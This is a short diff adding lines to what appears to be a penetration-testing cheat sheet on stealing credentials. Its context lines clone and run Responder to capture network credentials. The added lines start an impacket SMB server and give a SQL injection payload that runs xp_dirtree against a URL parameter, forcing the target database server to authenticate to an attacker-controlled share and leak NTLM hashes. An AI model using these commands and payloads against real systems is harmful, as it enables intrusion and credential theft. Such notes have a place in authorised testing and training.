@@ -69,3 +69,6 @@ Using Responder to Steal Creds
      # git clone https://github.com/SpiderLabs/Responder.git 
      # python Responder.py -i local-ip -I eth0
      
+Useing impacket to steal NTML hashes - similar to sql injection look for =# at the end of the url.
+# impacket-smbserver hack $(pwd)
+http://<IP ADDRESS>/page.aspx?somethingid=15; use master; exec xp_dirtree '\\<LHOST>\<SHARE>';--
